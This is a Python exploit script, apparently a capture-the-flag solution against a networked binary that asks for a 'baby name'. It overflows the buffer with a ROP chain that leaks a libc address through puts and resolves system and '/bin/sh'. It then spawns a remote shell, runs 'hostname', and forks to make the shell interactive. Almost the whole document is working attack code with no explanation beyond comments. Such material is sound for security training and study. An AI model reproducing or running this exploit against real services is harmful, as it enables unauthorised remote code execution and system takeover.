#!/bin/env python
import sys; 
import socket;
import argparse;
from struct import pack; 
import os, pty;

parser=argparse.ArgumentParser();
parser.add_argument("host", help="remote host to connect to")
parser.add_argument("port", type=int, help="remote port to connect to")
args=parser.parse_args()

offset=24 

gethex=lambda bstr: "".join(f'{hex(c)[2:]:0>2}' for c in bstr) #[2:] to remove 0x, :0>2 to pad the single digit
getaddr=lambda bstr: gethex(pack("<Q",int(f'{gethex(bstr):0<16}', base=16)))
getaddratoffset=lambda addr, offset: hex(int(addr,16)-offset)[2:].rjust(16,"0")
p64=lambda addr: pack("<Q",int(addr,16))

def recvto(s,rawstr):
    bytez=b""
    while True:
        bytez+=s.recv(4096)
        if bytez.endswith(rawstr):
            break
    return bytez

###### part 1 verify the version of libc by means of str_sh_addr 
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((args.host, args.port))
    print(recvto(s,b"what is your baby name?\x0a").decode("utf-8"),end="")
    payload=[ b"A"*offset,                      #padding
          b"\x5b\x14\x40\x00" + b"\x00"*4,      #rop of pop rdi +ret
          b"\x18\x40\x40\x00" + b"\x00"*4,      #puts@got
          b"\x30\x10\x40\x00" + b"\x00"*4,      #puts@plt
          b"\xdc\x11\x40\x00" + b"\x00"*4,      #&ask_baby_name
          b"\x0a" ]
    s.sendall(b"".join(payload))
    msg=recvto(s,b"what is your baby name?\x0a")
#    print(f"{msg}");
    blines=msg.split(b"\x0a")
#   print(list(map(gethex,blines)))
    leaked_addr=getaddr(blines[0])
    print(f'leaked address: {leaked_addr}')
    libc_base_addr=getaddratoffset(leaked_addr,0x765f0) #0x765f0 is the puts vaddr in symbol table of remote libc 
    print(f'libc base address: {libc_base_addr}')
    #print(blines[1].decode("utf-8"))
         
###### part 2 verify the version of libc by means of str_sh_addr 
    str_sh_addr=getaddratoffset(libc_base_addr,-0x18a152) #0x18a152 is grabbed with $strings -a -t x libc6-amd64* | grep "/bin/sh" 
    #str_sh_addr=getaddratoffset(leaked_addr,-0x18a156) #0x18a156 the other string value revealed not matching
    print(f'string shell address: {str_sh_addr}')
    #print(f'raw string shell address: {p64(str_sh_addr)}')

    system_addr=getaddratoffset(libc_base_addr,-0x48e50) #0x48e50 is the system vaddr in symbol table of remote libc 
    print(f'system address: {system_addr}')
    exit_addr=getaddratoffset(libc_base_addr,-0xcb670) #0xcb670 is the _exit vaddr in symbol table of remote libc
    print(f'exit address: {exit_addr}')

    print(blines[1].decode("utf-8")) # the prompt to prove ask_baby_name is been called again 
    #prove the offset calling puts(str_sh_addr), if fails program crash else print out "/bin/sh"
    #test it with all offset found in the different libc versions
    payload=[ b"A"*offset,                      #padding 
              b"\x5b\x14\x40\x00" + b"\x00"*4,  #rop of pop rdi + ret
              p64(str_sh_addr),                 #"/bin/sh"
              b"\x30\x10\x40\x00" + b"\x00"*4,  #puts@plt
              b"\xdc\x11\x40\x00" + b"\x00"*4,  #&ask_baby_name
              b"\x0a" ]
    
    s.sendall(b"".join(payload))
    msg=recvto(s,b"what is your baby name?\x0a")
    print(msg.decode("utf-8"),end="");

###### part 3 launch system("/bin/sh") on the remote host and send the command hostname to the shell   
    payload=[ b"A"*offset,                      #padding 
              b"\x5b\x14\x40\x00" + b"\x00"*4,  #rop of pop rdi + ret
              p64(str_sh_addr),                 #"/bin/sh"
              p64(system_addr),                 #&system
              p64(exit_addr),                   #&exit
              b"\x0a" ]
    s.sendall(b"".join(payload))
    s.sendall(b"hostname\n")
    msg=recvto(s,b"\x0a").decode("utf-8")
    print(msg,end="")

##### part 4 make it interactive
    pid=os.fork()
    if pid>0:
        #it's blind we could attach the cat stdin 0 to the keyboard or to the socket, that's the reason we fork
        os.dup2(s.fileno(),1) 
        os.execv("/bin/cat", ["/bin/cat"])
    else:
        while True:
            data=s.recv(4096)
            print(data.decode("utf-8"),end="")
 
